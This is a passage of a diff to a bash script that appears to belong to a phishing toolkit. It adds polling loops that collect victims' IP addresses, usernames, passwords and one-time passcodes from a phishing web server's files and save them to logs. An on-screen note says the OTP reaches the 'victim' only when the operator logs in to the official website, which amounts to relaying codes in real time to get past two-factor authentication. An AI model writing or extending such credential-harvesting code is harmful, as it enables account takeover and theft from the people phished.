+	                cat ${dumps_dir}/space.txt >> ${final_log_name}
+                        cat ${www_dir}/pattern.txt >> ${final_log_name}
+                        mv ${www_dir}/pattern.txt  "${final_log_dir}"
+                        echo -ne "\n${CYAN}Saved in Logs"
+                fi
+                sleep 0.5
+	done
+}
+## Print data no otp
+capture_data_notp() {  
+	while true; do
+                if [[ -e "${www_dir}/ip.txt" ]]; then
+                        capture_ip
+                fi
+                sleep 0.75
+                if [[ -e "${www_dir}/usernames.txt" ]]; then
+                        capture_id
+			capture_pass
+			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Next Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit. "
+                fi
+                sleep 0.75
+	done
+}
+
+## Print data otp
+capture_data_ootp() {
+	while true; do
+                if [[ -e "${www_dir}/ip.txt" ]]; then
+                        capture_ip
+                fi
+                sleep 0.75
+                if [[ -e "${www_dir}/usernames.txt" ]]; then
+                        capture_id
+			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for OTP > "
+			echo -ne "\n${ITALICWHITE} NOTE : OTP will only be sent to victim when you login to offical website ${NA}"
+                fi
+		if [[ -e "${www_dir}/otp.txt" ]]; then
+                        capture_otp
+			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Next Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit. "
+                fi
+                sleep 0.75
+	done
+}
+
+## Print data notp & otp
+capture_data_potp() {
+	while true; do
+                if [[ -e "${www_dir}/ip.txt" ]]; then
+                        capture_ip
+                fi
+                sleep 0.75
+                if [[ -e "${www_dir}/usernames.txt" ]]; then
+                        capture_id
+			capture_pass
+			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for OTP >"
+                       echo -ne "\n${ITALICWHITE} NOTE : OTP will only be sent to victim when you login to offical website ${NA}"
+                fi
+		if [[ -e "${www_dir}/otp.txt" ]]; then
+			capture_otp
+			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Next Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit. "
+		fi
+                sleep 0.75
+	done
 }
 
 ## Tunnel selection
